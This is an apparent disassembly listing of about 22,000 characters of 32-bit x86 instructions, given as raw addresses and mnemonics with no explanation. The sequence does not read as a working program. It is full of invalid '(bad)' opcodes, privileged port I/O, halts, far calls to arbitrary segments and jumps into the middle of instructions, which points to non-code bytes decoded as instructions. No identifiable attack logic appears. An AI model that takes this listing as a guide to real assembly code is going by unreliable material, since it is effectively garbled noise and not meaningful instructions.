  41bd05:	push   ebx
  41bd06:	push   eax
  41bd07:	mov    cl,0x3d
  41bd09:	ficom  DWORD PTR ds:0x5bb3d4b7
  41bd0f:	repnz add ch,bh
  41bd12:	cmc    
  41bd13:	push   ds
  41bd14:	out    dx,eax
  41bd15:	or     al,0x29
  41bd17:	cmc    
  41bd18:	pop    edi
  41bd19:	mov    ecx,0x74f4a6a8
  41bd1e:	lods   eax,DWORD PTR ds:[esi]
  41bd1f:	int    0x99
  41bd21:	pop    esi
  41bd22:	mov    ch,0x5b
  41bd24:	push   es
  41bd25:	ins    DWORD PTR es:[edi],dx
  41bd26:	mov    esi,0x42c25f62
  41bd2b:	lds    ebx,FWORD PTR [edi+edx*1+0x33a94197]
  41bd32:	imul   esp,DWORD PTR [ecx],0xb7074e4a
  41bd38:	pop    es
  41bd39:	js     0x41bd78
  41bd3b:	mul    DWORD PTR [edx+0x1455eaf1]
  41bd41:	(bad)  
  41bd42:	pop    ebp
  41bd43:	sub    DWORD PTR [ebx-0x4],esi
  41bd46:	aam    0xda
  41bd48:	std    
  41bd49:	sbb    eax,0xc6ba638d
  41bd4e:	jg     0x41bd9b
  41bd50:	popa   
  41bd51:	mov    bh,BYTE PTR [edx+0x50]
  41bd54:	enter  0xd301,0xe7
  41bd58:	popf   
  41bd59:	mov    ecx,0xe9824b6c
  41bd5e:	clc    
  41bd5f:	pop    esi
  41bd60:	push   ebp
  41bd61:	sahf   
  41bd62:	inc    edx
  41bd63:	jb     0x41bdc2
  41bd65:	xor    eax,0xad8dd90c
  41bd6a:	mov    al,ds:0x4c01d1ba
  41bd6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd70:	sahf   
  41bd71:	xor    esi,ebx
  41bd73:	and    DWORD PTR [edx+0x7b],0x3b
  41bd77:	mov    edi,esi
  41bd79:	adc    dh,BYTE PTR [esi-0x17a8213a]
  41bd7f:	inc    sp
  41bd81:	sbb    DWORD PTR [eax+0x36],0x657db686
  41bd88:	idiv   BYTE PTR [eax+0x4f276f22]
  41bd8e:	fidivr DWORD PTR [edx-0x12]
  41bd91:	cmc    
  41bd92:	jg     0x41bdfe
  41bd94:	mov    dl,0xde
  41bd96:	jnp    0x41bdc6
  41bd98:	dec    ebp
  41bd99:	mov    ebx,0x8ef8c7bc
  41bd9e:	cli    
  41bd9f:	ror    DWORD PTR [ecx+edx*4+0x25],0xfb
  41bda4:	loope  0x41bd47
  41bda6:	push   ecx
  41bda7:	sbb    dl,0xe6
  41bdaa:	xchg   ebx,eax
  41bdab:	popa   
  41bdac:	sub    eax,0xd4d75ea1
  41bdb1:	adc    bl,BYTE PTR [eax+0xe]
  41bdb4:	nop
  41bdb5:	hlt    
  41bdb6:	pop    eax
  41bdb7:	imul   ebx,DWORD PTR ds:0x20deeb1b,0x87b147ca
  41bdc1:	cmp    DWORD PTR [eax],edx
  41bdc3:	push   eax
  41bdc4:	adc    ch,BYTE PTR [ecx]
  41bdc6:	in     eax,dx
  41bdc7:	sub    DWORD PTR [eax+0x9],0x26aad5fc
  41bdce:	mov    dh,0x5e
  41bdd0:	fbld   TBYTE PTR [ebx+0x5ccbb916]
  41bdd6:	out    dx,eax
  41bdd7:	gs fwait
  41bdd9:	inc    edx
  41bdda:	add    eax,0x1eb35585
  41bddf:	clc    
  41bde0:	push   ebp
  41bde1:	add    dl,BYTE PTR [ecx+0x71]
  41bde4:	jg     0x41bdae
  41bde6:	call   edx
  41bde8:	and    DWORD PTR ds:0x73df98be,ebp
  41bdee:	add    eax,DWORD PTR [eax]
  41bdf0:	ffreep st(2)
  41bdf2:	xchg   DWORD PTR [eax],ebx
  41bdf4:	mov    ebx,0xee4856e5
  41bdf9:	sbb    eax,0xd9ce32d3
  41bdfe:	cld    
  41bdff:	jecxz  0x41bdde
  41be01:	mov    ebx,0x83521629
  41be06:	adc    DWORD PTR [edx],eax
  41be08:	xchg   esp,eax
  41be09:	dec    ecx
  41be0a:	retf   
  41be0b:	adc    ebp,edi
  41be0d:	pop    es
  41be0e:	add    ebx,DWORD PTR [ecx-0x41d2426b]
  41be14:	out    dx,al
  41be15:	jge    0x41bdb6
  41be17:	pop    edx
  41be18:	inc    ecx
  41be19:	popa   
  41be1a:	or     al,0x80
  41be1c:	pop    eax
  41be1d:	jle    0x41be38
  41be1f:	lahf   
  41be20:	push   ds
  41be21:	hlt    
  41be22:	icebp  
  41be23:	adc    DWORD PTR [edx+0x6e],0x54
  41be27:	mov    edx,0x81ac65fc
  41be2c:	ja     0x41bea3
  41be2e:	push   ebp
  41be2f:	mov    ah,0xe3
  41be31:	rol    BYTE PTR [esi],0x8e
  41be34:	out    dx,eax
  41be35:	int3   
  41be36:	iret   
  41be37:	dec    ecx
  41be38:	int    0xe
  41be3a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41be3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3d:	out    dx,al
  41be3e:	aas    
  41be3f:	or     ecx,DWORD PTR [ebx-0x1497419c]
  41be45:	dec    edi
  41be46:	inc    edx
  41be47:	push   es
  41be48:	cs (bad) 
  41be4a:	and    DWORD PTR [edx],edi
  41be4c:	push   0xf70915b3
  41be51:	ins    BYTE PTR es:[edi],dx
  41be52:	sbb    ebx,esp
  41be54:	mov    ah,0x8a
  41be56:	pusha  
  41be57:	mov    eax,ds:0xc657a580
  41be5c:	mov    ebx,esi
  41be5e:	(bad)
  41be61:	dec    ecx
  41be62:	mov    ch,0x5b
  41be64:	and    eax,0x1d226d1
  41be69:	daa    
  41be6a:	jo     0x41bebf
  41be6c:	fld    TBYTE PTR [ebx-0x19]
  41be6f:	mov    ebx,0x6f0036c9
  41be74:	mov    ebp,0xf9e274bc
  41be79:	aaa    
  41be7a:	mov    ebx,0x3342bc78
  41be7f:	mov    cl,0x7
  41be81:	ftst   
  41be83:	or     edx,ebx
  41be85:	lds    edi,FWORD PTR [edx-0x28]
  41be88:	mov    edx,0xbdc8c424
  41be8d:	mov    dh,0xac
  41be8f:	mov    edi,0x69dfb4a3
  41be94:	xor    BYTE PTR [esi],ah
  41be96:	cmp    al,0xfe
  41be98:	or     BYTE PTR [edx],bh
  41be9a:	out    0xec,eax
  41be9c:	enter  0xd30e,0x4a
  41bea0:	and    al,0xd1
  41bea2:	jbe    0x41befa
  41bea4:	and    esi,ebp
  41bea6:	push   0xfffffffd
  41bea8:	scas   al,BYTE PTR es:[edi]
  41bea9:	outs   dx,DWORD PTR ds:[esi]
  41beaa:	out    0xc,al
  41beac:	and    ch,BYTE PTR [ebp+eiz*1+0x218218fa]
  41beb3:	fdivrp st(2),st
  41beb5:	hlt    
  41beb6:	and    dl,BYTE PTR ds:[ebp+0x4e]
  41beba:	or     BYTE PTR [ecx],0x90
  41bebd:	adc    ebx,edi
  41bebf:	mov    dl,0xcb
  41bec1:	ins    DWORD PTR es:[edi],dx
  41bec2:	shr    DWORD PTR [edi+ebp*1-0x403e31d5],0xe7
  41beca:	inc    edx
  41becb:	xchg   ecx,eax
  41becc:	or     bh,BYTE PTR [edx+0x307481f3]
  41bed2:	mov    al,0xb9
  41bed4:	xor    al,0x94
  41bed6:	adc    al,0xf3
  41bed8:	fisubr DWORD PTR [edx+edx*8]
  41bedb:	dec    eax
  41bedc:	fs nop
  41bede:	sar    BYTE PTR ds:0xe6187d0,cl
  41bee4:	(bad)  
  41bee5:	mov    eax,0x77dc92d0
  41beea:	stos   BYTE PTR es:[edi],al
  41beeb:	lock or dl,BYTE PTR [ecx+0x7ab12a45]
  41bef2:	xor    al,0x9b
  41bef4:	cmp    BYTE PTR [edi-0x22843254],ch
  41befa:	inc    edx
  41befb:	bound  ebp,QWORD PTR [edi]
  41befd:	daa    
  41befe:	xchg   ebp,eax
  41beff:	sbb    BYTE PTR [ebp-0x17069f48],0xcd
  41bf06:	jecxz  0x41bed5
  41bf08:	clc    
  41bf09:	dec    ecx
  41bf0a:	mov    ebp,0xeb3bacbc
  41bf0f:	in     al,dx
  41bf10:	(bad)  
  41bf12:	out    dx,al
  41bf13:	pop    eax
  41bf14:	inc    ebp
  41bf15:	adc    BYTE PTR [esi-0x59817099],al
  41bf1b:	(bad)  
  41bf1d:	jp     0x41bf3f
  41bf1f:	sti    
  41bf20:	push   ecx
  41bf21:	adc    al,0x42
  41bf23:	shl    DWORD PTR [ecx-0x13b39d70],cl
  41bf29:	mov    BYTE PTR [eax-0xa],bh
  41bf2c:	repnz dec esp
  41bf2e:	jle    0x41bf23
  41bf30:	ds inc ebx
  41bf32:	cli    
  41bf33:	dec    eax
  41bf34:	ret    
  41bf35:	jmp    0xd6ed:0xa8238930
  41bf3c:	arpl   WORD PTR [ecx+0x75],bx
  41bf3f:	loope  0x41bf8d
  41bf41:	hlt    
  41bf42:	push   ss
  41bf43:	push   esp
  41bf44:	xchg   DWORD PTR [ebx-0x5c],ebp
  41bf47:	inc    eax
  41bf48:	and    dh,dl
  41bf4a:	mov    ebx,DWORD PTR [eax+0x24b63c07]
  41bf50:	data16 hlt 
  41bf52:	sbb    ecx,DWORD PTR [esi]
  41bf54:	push   ds
  41bf55:	scas   eax,DWORD PTR es:[edi]
  41bf56:	xchg   esi,eax
  41bf57:	retf   
  41bf58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf59:	fst    QWORD PTR [ecx]
  41bf5b:	push   ebp
  41bf5c:	in     al,0x12
  41bf5e:	or     BYTE PTR [ebx-0x6d18718e],bh
  41bf64:	and    esi,esp
  41bf66:	xchg   ebp,eax
  41bf67:	test   BYTE PTR [edx-0x1578468b],dh
  41bf6d:	inc    ecx
  41bf6e:	mov    ebp,0x7e79e490
  41bf73:	jmp    0x41bf7a
  41bf75:	(bad)  
  41bf76:	xor    ecx,DWORD PTR [eax+0x8]
  41bf79:	jno    0x41bf98
  41bf7b:	fld    DWORD PTR [ebx+0x2ad23d13]
  41bf81:	and    BYTE PTR [ebx],bl
  41bf83:	and    dl,BYTE PTR [ebx+esi*8]
  41bf86:	sbb    eax,DWORD PTR [ebx-0x2d]
  41bf89:	jne    0x41bfc6
  41bf8b:	mov    dl,0x2c
  41bf8d:	stc    
  41bf8e:	jno    0x41bf8d
  41bf90:	fisubr DWORD PTR [eax]
  41bf92:	mov    WORD PTR [eax+edx*8-0x27],ss
  41bf96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf97:	les    ebx,FWORD PTR [esi]
  41bf99:	push   es
  41bf9a:	loope  0x41bf72
  41bf9c:	mov    esi,0x18b68dee
  41bfa1:	and    bh,bh
  41bfa3:	xchg   ebp,eax
  41bfa4:	pop    ebx
  41bfa5:	xor    ebx,DWORD PTR [ebx]
  41bfa7:	mov    BYTE PTR [edx+0x3e],dh
  41bfaa:	mov    cl,0xd5
  41bfac:	ror    BYTE PTR [eax],cl
  41bfae:	ja     0x41bf94
  41bfb0:	adc    BYTE PTR [eax+0x57ee12e],0x3a
  41bfb7:	in     al,dx
  41bfb8:	shr    BYTE PTR [eax],0x98
  41bfbb:	adc    eax,esp
  41bfbd:	sub    ch,bl
  41bfbf:	pusha  
  41bfc0:	mov    esi,0x9576d9a8
  41bfc5:	push   ss
  41bfc6:	pop    es
  41bfc7:	cdq    
  41bfc8:	data16 cld 
  41bfca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfcb:	fcmovbe st,st(7)
  41bfcd:	push   DWORD PTR [esi-0x4b]
  41bfd0:	retf   
  41bfd1:	dec    edx
  41bfd2:	call   0xdbc87d6e
  41bfd7:	pop    ds
  41bfd8:	xlat   BYTE PTR ds:[ebx]
  41bfd9:	lods   al,BYTE PTR ds:[esi]
  41bfda:	fwait
  41bfdb:	popa   
  41bfdc:	stos   BYTE PTR es:[edi],al
  41bfdd:	ins    DWORD PTR es:[edi],dx
  41bfde:	call   0x3174:0x45f2621e
  41bfe5:	add    eax,0x72b95b9
  41bfea:	test   BYTE PTR [ebx+0x4add8e84],al
  41bff0:	mov    esi,0xb0a79e37
  41bff5:	adc    ecx,DWORD PTR fs:[esi-0x3a]
  41bff9:	xchg   esi,eax
  41bffa:	jge    0x41bf98
  41bffc:	das    
  41bffd:	pop    es
  41bffe:	out    0x18,eax
  41c000:	and    edx,DWORD PTR [edi+esi*1+0x60]
  41c004:	aad    0x66
  41c006:	sbb    eax,0x9f1b15e0
  41c00b:	cld    
  41c00c:	mov    edx,DWORD PTR [ebx-0x7a]
  41c00f:	dec    eax
  41c010:	aas    
  41c011:	iret   
  41c012:	xchg   esi,eax
  41c013:	retf   
  41c014:	and    DWORD PTR [esi+0x31],0x5
  41c018:	xor    ch,BYTE PTR [edi+0x50]
  41c01b:	xchg   ebp,eax
  41c01c:	fsub   st,st(1)
  41c01e:	push   es
  41c01f:	out    0x9e,eax
  41c021:	sbb    BYTE PTR [edx],dh
  41c023:	out    0x6f,eax
  41c025:	(bad)  
  41c026:	call   0x96bd:0x28bd3a44
  41c02d:	out    dx,al
  41c02e:	adc    ebp,DWORD PTR [edx+0x7f]
  41c031:	push   ecx
  41c032:	or     eax,0xf376cdd8
  41c037:	push   ecx
  41c038:	lea    eax,[ebp+ebx*2+0x1d093089]
  41c03f:	dec    edx
  41c040:	jne    0x41c0aa
  41c042:	jmp    0x41c087
  41c044:	popa   
  41c045:	cwde   
  41c046:	psadbw mm2,QWORD PTR [ecx+0x21]
  41c04a:	aaa    
  41c04b:	pop    esi
  41c04c:	test   cl,ah
  41c04e:	ret    
  41c04f:	cmc    
  41c050:	xor    al,BYTE PTR fs:[eax-0x546a4c17]
  41c057:	mov    es,WORD PTR [eax]
  41c059:	stos   BYTE PTR es:[edi],al
  41c05a:	rol    edx,1
  41c05c:	hlt    
  41c05d:	mov    cl,0xea
  41c05f:	cmp    BYTE PTR [ebp+eax*1+0x2106bd4d],bl
  41c066:	(bad)  
  41c067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c068:	lock retf 0xfd7
  41c06c:	call   0xb8ad1d76
  41c071:	jne    0x41c037
  41c073:	fist   DWORD PTR [edi+0x34]
  41c076:	ss jbe 0x41c0a4
  41c079:	retf   
  41c07a:	js     0x41c0cc
  41c07c:	mov    edi,0x56ac2844
  41c081:	pop    edx
  41c082:	out    0x62,eax
  41c084:	sbb    al,0x98
  41c086:	sub    DWORD PTR ds:0xb33e4ea4,eax
  41c08c:	cmp    al,0x64
  41c08e:	test   eax,0x241b44af
  41c093:	xchg   edi,eax
  41c094:	stos   BYTE PTR es:[edi],al
  41c095:	je     0x41c04d
  41c097:	(bad)  
  41c098:	mov    edx,0x935a23c4
  41c09d:	xor    BYTE PTR [edi],bl
  41c09f:	xor    eax,0x2bd8ef00
  41c0a4:	push   ecx
  41c0a5:	mov    dl,0x99
  41c0a7:	or     ch,BYTE PTR [ecx+0x6bedb76c]
  41c0ad:	jnp    0x41c08a
  41c0af:	pop    ds
  41c0b0:	push   0x9bd4b68e
  41c0b5:	pop    es
  41c0b6:	and    ch,ah
  41c0b8:	jno    0x41c12f
  41c0ba:	push   es
  41c0bb:	aam    0xd1
  41c0bd:	xchg   dh,dh
  41c0bf:	rol    BYTE PTR [edi+0x6bfd067c],cl
  41c0c5:	lahf   
  41c0c6:	jmp    0x41c146
  41c0c8:	pusha  
  41c0c9:	outs   dx,BYTE PTR ss:[esi]
  41c0cb:	push   es
  41c0cc:	sbb    ebx,eax
  41c0ce:	push   cs
  41c0cf:	das    
  41c0d0:	xchg   edx,eax
  41c0d1:	sahf   
  41c0d2:	mov    ebx,0xfa9352bb
  41c0d7:	push   ebp
  41c0d8:	dec    ecx
  41c0d9:	xchg   DWORD PTR [edx],ecx
  41c0db:	xor    cl,bh
  41c0dd:	int    0x8d
  41c0df:	pushf  
  41c0e0:	cmp    DWORD PTR [ebp+ebp*4+0x31],esp
  41c0e4:	call   0x54b9:0x23aa744c
  41c0eb:	and    al,0x5d
  41c0ed:	push   esp
  41c0ee:	or     BYTE PTR ds:0x7aeb93ec,dh
  41c0f4:	je     0x41c0de
  41c0f6:	scas   al,BYTE PTR es:[edi]
  41c0f7:	scas   eax,DWORD PTR es:[edi]
  41c0f8:	dec    esi
  41c0f9:	mov    ch,0x2f
  41c0fb:	cmp    eax,eax
  41c0fd:	dec    ebp
  41c0fe:	lods   eax,DWORD PTR ds:[esi]
  41c0ff:	pop    esi
  41c100:	iret   
  41c101:	clc    
  41c102:	xchg   BYTE PTR [edx],ch
  41c104:	mov    eax,ds:0xba3e6db1
  41c109:	or     al,0xf7
  41c10b:	or     ah,dh
  41c10d:	mov    ebp,0x8a062da4
  41c112:	idiv   DWORD PTR [edi]
  41c114:	shr    BYTE PTR [esi*1+0x55e6a2e4],1
  41c11b:	fnstcw WORD PTR [eax+0x51]
  41c11e:	pop    ebx
  41c11f:	fmul   QWORD PTR [eax+esi*2-0x301e2599]
  41c126:	cmp    al,0xc0
  41c128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c129:	jo     0x41c0f0
  41c12b:	xlat   BYTE PTR ds:[ebx]
  41c12c:	sub    BYTE PTR [ebx],ah
  41c12e:	pop    esp
  41c12f:	dec    eax
  41c130:	mov    dh,0x4f
  41c132:	dec    ebp
  41c133:	lahf   
  41c134:	sub    eax,0x2557bfde
  41c139:	inc    esp
  41c13a:	mov    esi,0x18dc9539
  41c13f:	push   es
  41c140:	(bad)  
  41c141:	jp     0x41c16d
  41c143:	mov    cl,0x96
  41c145:	rol    edi,1
  41c147:	imul   DWORD PTR [esp+ebx*2]
  41c14a:	mov    DWORD PTR [ecx+0x5e31ac4d],edx
  41c150:	nop
  41c151:	xchg   ebp,eax
  41c152:	jge    0x41c1a2
  41c154:	dec    ebp
  41c155:	mov    WORD PTR [ecx-0x629e0b26],gs
  41c15b:	fdivr  st,st(3)
  41c15d:	out    0xf2,eax
  41c15f:	int    0xf
  41c161:	fstp   TBYTE PTR [esi+0x2e]
  41c164:	push   0xffffffb4
  41c166:	or     al,0x2c
  41c168:	pop    ebx
  41c169:	in     eax,dx
  41c16a:	add    eax,0xc6a43377
  41c16f:	sub    DWORD PTR [eax+ebp*8],0x4d
  41c173:	pop    esp
  41c174:	in     al,0x9d
  41c176:	sti    
  41c177:	push   edx
  41c178:	imul   esi,esi,0xffffff8f
  41c17b:	mov    ebx,0x791c7bf7
  41c180:	inc    edi
  41c181:	pop    es
  41c182:	mov    al,0x7a
  41c184:	push   esi
  41c185:	ins    BYTE PTR es:[edi],dx
  41c186:	jmp    0xaeff5a11
  41c18b:	fisub  DWORD PTR [edx-0x21981fad]
  41c191:	out    0x8a,al
  41c193:	mov    al,0x84
  41c195:	imul   edx,DWORD PTR [ecx],0xffffffe4
  41c198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c199:	sub    al,0x26
  41c19b:	call   0x8cdfdefe
  41c1a0:	xchg   DWORD PTR [eax-0x4a],edx
  41c1a3:	push   esi
  41c1a4:	pop    ss
  41c1a5:	and    eax,0x65166f00
  41c1aa:	(bad)  
  41c1ac:	adc    al,0x76
  41c1ae:	inc    esp
  41c1af:	inc    esp
  41c1b0:	mov    eax,ds:0xad7e3ed9
  41c1b5:	jg     0x41c187
  41c1b7:	push   esp
  41c1b8:	imul   ebp
  41c1ba:	outs   dx,BYTE PTR ds:[esi]
  41c1bb:	adc    eax,0x5849e647
  41c1c0:	or     eax,0x69c3da4e
  41c1c5:	repnz retf 0xf1d6
  41c1c9:	inc    ebx
  41c1ca:	mov    eax,DWORD PTR [eax-0x112ab1a2]
  41c1d0:	cmp    esi,ebx
  41c1d2:	and    edi,esp
  41c1d4:	dec    edi
  41c1d5:	pop    ebp
  41c1d6:	and    ah,BYTE PTR [esi+0x35986ce8]
  41c1dc:	jmp    0x41c24b
  41c1de:	push   0x3c
  41c1e0:	imul   esi,DWORD PTR [ebx+0x71a7c2e3],0x6
  41c1e7:	out    dx,eax
  41c1e8:	loope  0x41c1c1
  41c1ea:	pop    ecx
  41c1eb:	mov    eax,ds:0xf1252a5f
  41c1f0:	mov    ebp,0x3a9037
  41c1f5:	test   BYTE PTR [ebx],dh
  41c1f7:	pop    edx
  41c1f8:	shl    DWORD PTR ds:0x1034333f,0xb7
  41c1ff:	ins    DWORD PTR es:[edi],dx
  41c200:	std    
  41c201:	in     eax,0x6f
  41c203:	push   ebx
  41c204:	fild   DWORD PTR [ebx+0x4]
  41c207:	pop    ecx
  41c208:	(bad)  
  41c209:	int    0x16
  41c20b:	cdq    
  41c20c:	rcl    BYTE PTR ds:0x9684ef30,0x45
  41c213:	(bad)  
  41c214:	or     DWORD PTR [eax+ebp*1+0x33e37322],esp
  41c21b:	retf   
  41c21c:	and    DWORD PTR [ebx],esi
  41c21e:	xchg   DWORD PTR [eax],esp
  41c220:	or     eax,0x42e7fc4c
  41c225:	loopne 0x41c1e6
  41c227:	fwait
  41c228:	scas   eax,DWORD PTR es:[edi]
  41c229:	popf   
  41c22a:	ret    
  41c22b:	add    al,0xb
  41c22d:	adc    BYTE PTR ds:0x6e95dc53,0x4b
  41c234:	mov    gs,WORD PTR [ebp+0x1c]
  41c237:	mov    ss,WORD PTR [ecx]
  41c239:	add    eax,0x92b21e24
  41c23e:	test   BYTE PTR [ebx+0x6d212701],cl
  41c244:	cli    
  41c245:	cmp    eax,0x2b57efb9
  41c24a:	sti    
  41c24b:	mov    dh,0x0
  41c24d:	in     eax,dx
  41c24e:	rol    DWORD PTR [esi],1
  41c250:	fxtract 
  41c252:	add    DWORD PTR [edi],esp
  41c254:	scas   eax,DWORD PTR es:[edi]
  41c255:	dec    ebp
  41c256:	leave  
  41c257:	mov    eax,ds:0x29fa5218
  41c25c:	outs   dx,BYTE PTR ds:[si]
  41c25e:	mov    eax,ds:0x93c95931
  41c263:	push   ebp
  41c264:	lods   al,BYTE PTR ds:[esi]
  41c265:	jg     0x41c272
  41c267:	jae    0x41c261
  41c269:	xchg   BYTE PTR [ebp-0x19],al
  41c26c:	cld    
  41c26d:	mov    ds:0xcb56d77b,al
  41c272:	icebp  
  41c273:	sbb    eax,0xe58ee107
  41c278:	mov    bl,0x48
  41c27a:	and    bh,BYTE PTR [edi-0x57]
  41c27d:	imul   BYTE PTR [edi+0x4251172d]
  41c283:	jnp    0x41c226
  41c285:	(bad)  
  41c286:	inc    eax
  41c287:	cmp    eax,0x896b8f24
  41c28c:	fwait
  41c28d:	and    eax,0x4a19f891
  41c292:	mov    al,ds:0x77cda5b1
  41c297:	cs in  eax,dx
  41c299:	(bad)  
  41c29a:	jne    0x41c2a0
  41c29c:	sbb    BYTE PTR [edi-0x50],dh
  41c29f:	fiadd  DWORD PTR [ebp+0x57caefbe]
  41c2a5:	cdq    
  41c2a6:	ffreep st(1)
  41c2a8:	inc    ecx
  41c2a9:	das    
  41c2aa:	retf   
  41c2ab:	mov    al,ds:0xea03f5d2
  41c2b0:	shl    ch,cl
  41c2b2:	or     BYTE PTR [ecx+ebx*1],ah
  41c2b5:	mov    ds:0xd57966f8,al
  41c2ba:	xchg   ebx,ecx
  41c2bc:	(bad)  
  41c2bd:	fdiv   st(5),st
  41c2bf:	jmp    0x41c302
  41c2c1:	inc    ebx
  41c2c2:	test   eax,0x75d5c25e
  41c2c7:	mov    esi,0x88a94080
  41c2cc:	dec    edi
  41c2cd:	lea    ebp,ds:0x3905f726
  41c2d3:	mov    bh,0x1f
  41c2d5:	daa    
  41c2d6:	call   0x53dd:0x32508add
  41c2dd:	jp     0x41c331
  41c2df:	ror    BYTE PTR [esi],cl
  41c2e1:	lahf   
  41c2e2:	xor    DWORD PTR ds:0xce28fd15,esi
  41c2e8:	and    DWORD PTR [ecx],edx
  41c2ea:	jo     0x41c270
  41c2ec:	pop    eax
  41c2ed:	xor    edx,DWORD PTR [esi+0x164fb47c]
  41c2f3:	cli    
  41c2f4:	inc    edi
  41c2f5:	cmp    cl,BYTE PTR ds:0x4f6d37b2
  41c2fb:	pop    es
  41c2fc:	or     eax,DWORD PTR [ebx+0x27806aca]
  41c302:	mov    esi,0x7dec393b
  41c307:	mov    bl,0xc1
  41c309:	add    edi,DWORD PTR [esi]
  41c30b:	xchg   DWORD PTR [esi+0x2e],eax
  41c30e:	inc    eax
  41c30f:	out    0x51,al
  41c311:	rcl    BYTE PTR [ebx-0x77150bf8],1
  41c317:	jae    0x41c30b
  41c319:	jge    0x41c2ec
  41c31b:	and    cl,BYTE PTR [ebp+0x5f2d521]
  41c321:	jno    0x41c31d
  41c323:	fidivr WORD PTR [edx]
  41c325:	(bad)  
  41c326:	ds sbb eax,0x6644afe3
  41c32c:	adc    eax,0xfda63f45
  41c331:	arpl   di,bx
  41c333:	xchg   esi,eax
  41c334:	aad    0x16
  41c336:	xchg   ebp,eax
  41c337:	xlat   BYTE PTR ds:[ebx]
  41c338:	cmc    
  41c339:	or     dl,ah
  41c33b:	mov    ebx,0xc2eff68f
  41c340:	add    DWORD PTR [eax-0x4628bf96],esi
  41c346:	(bad)  
  41c347:	jge    0x41c32b
  41c349:	fisttp DWORD PTR [esi-0x5326ce48]
  41c34f:	mov    dl,0x82
  41c351:	enter  0x3abe,0x64
  41c355:	inc    edx
  41c356:	dec    edx
  41c357:	jne    0x41c3bc
  41c359:	rcr    bh,1
  41c35b:	retf   
  41c35c:	dec    esi
  41c35d:	add    DWORD PTR [edi-0x70],esp
  41c360:	in     eax,0x68
  41c362:	js     0x41c3b7
  41c364:	fnstcw WORD PTR [esi]
  41c366:	lods   al,BYTE PTR ds:[esi]
  41c367:	test   al,ah
  41c369:	dec    esp
  41c36a:	sbb    dl,BYTE PTR [eax+0x39de1b18]
  41c370:	(bad)  
  41c371:	sti    
  41c372:	pop    ebx
  41c373:	adc    eax,esp
  41c375:	je     0x41c3db
  41c377:	inc    edx
  41c378:	test   al,0x7
  41c37a:	sbb    eax,DWORD PTR [eax-0x2d]
  41c37d:	mov    ds:0x6310eb4,eax
  41c382:	xchg   edi,esp
  41c384:	fwait
  41c385:	jmp    0xaa65:0x4f49f35c
  41c38c:	lea    esp,[eax-0x2ef4f9c9]
  41c392:	pop    ecx
  41c393:	push   edi
  41c394:	inc    edx
  41c395:	adc    edx,DWORD PTR [eax+0x27259161]
  41c39b:	mov    dl,0x58
  41c39d:	ins    BYTE PTR es:[edi],dx
  41c39e:	xor    DWORD PTR [ebp-0x4c],esp
  41c3a1:	sub    DWORD PTR [ecx+0x33],0xe729c3c3
  41c3a8:	push   edi
  41c3a9:	mov    eax,0x40bbb3d1
  41c3ae:	inc    edx
  41c3af:	aam    0xca
  41c3b1:	push   ebx
  41c3b2:	sub    eax,0xa2ebec9c
  41c3b7:	call   0xe92c:0x43221930
  41c3be:	and    DWORD PTR [ebx+0x29],ecx
  41c3c1:	shl    DWORD PTR [edx+edi*2],0x28
  41c3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c6:	cmp    esi,DWORD PTR [esi]
  41c3c8:	int    0x9c
  41c3ca:	cmp    BYTE PTR [edi+ecx*4],0x77
  41c3ce:	(bad)  
  41c3cf:	xor    BYTE PTR [eax+0x53],cl
  41c3d2:	xchg   DWORD PTR [ebp+0x4cc68c6b],edx
  41c3d8:	xchg   edi,eax
  41c3d9:	ja     0x41c3e7
  41c3db:	add    dh,BYTE PTR [di-0x47]
  41c3df:	pop    ds
  41c3e0:	mov    WORD PTR [esi-0x72c44ad5],?
  41c3e6:	scas   eax,DWORD PTR es:[edi]
  41c3e7:	and    esp,edx
  41c3e9:	sbb    DWORD PTR [ecx+0x343cae96],ebp
  41c3ef:	push   ds
  41c3f0:	or     BYTE PTR [edi+eax*1-0xe00c7c1],al
  41c3f7:	sbb    al,0x5b
  41c3f9:	stos   BYTE PTR es:[edi],al
  41c3fa:	and    ch,ch
  41c3fc:	xchg   edi,eax
  41c3fd:	sbb    edx,esp
  41c3ff:	xlat   BYTE PTR ds:[ebx]
  41c400:	xchg   edi,eax
  41c401:	sub    bh,BYTE PTR [esi-0x1c09e0ad]
  41c407:	mov    ebx,0x1c5cb660
  41c40c:	(bad)  
  41c40d:	mov    eax,0xb3418d49
  41c412:	cdq    
  41c413:	nop
  41c414:	mov    ds:0x66812d01,al
  41c419:	pop    ss
  41c41a:	loopne 0x41c3a7
  41c41c:	jmp    0xebf56873
  41c421:	es in  eax,0x18
  41c424:	test   al,0x6e
  41c426:	mov    edi,eax
  41c428:	dec    edx
  41c429:	mov    al,ds:0x801a92d8
  41c42e:	mov    al,BYTE PTR [eax+0x76]
  41c431:	mov    dl,0x39
  41c433:	dec    ebx
  41c434:	mov    esp,0x2bca5844
  41c439:	and    BYTE PTR [edi+0x759c7241],cl
  41c43f:	xor    BYTE PTR [ebx-0x2e],dh
  41c442:	adc    ebx,esi
  41c444:	scas   eax,DWORD PTR es:[edi]
  41c445:	push   ecx
  41c446:	cs sbb al,0x35
  41c449:	inc    ecx
  41c44a:	adc    BYTE PTR [edi+0x10858ace],0xfa
  41c451:	stos   DWORD PTR es:[edi],eax
  41c452:	pusha  
  41c453:	and    DWORD PTR [ebp+edx*4+0x11],ecx
  41c457:	retf   
  41c458:	inc    ecx
  41c459:	jnp    0x41c49f
  41c45b:	cdq    
  41c45c:	jmp    0xe277:0x5531bbae
  41c463:	or     eax,0x2bd43a1f
  41c468:	dec    esp
  41c469:	dec    ebp
  41c46a:	fwait
  41c46b:	pop    esi
  41c46c:	inc    eax
  41c46d:	sar    DWORD PTR [ecx-0x42],cl
  41c470:	mov    esi,0xd5b432d7
  41c475:	test   DWORD PTR [ebp-0x23b9c303],eax
  41c47b:	aam    0xcf
  41c47d:	repnz out dx,al
  41c47f:	cmp    DWORD PTR [esi-0x41],0xed851fc
  41c486:	jmp    eax
  41c488:	clc    
  41c489:	dec    DWORD PTR [eax-0x1523a5ed]
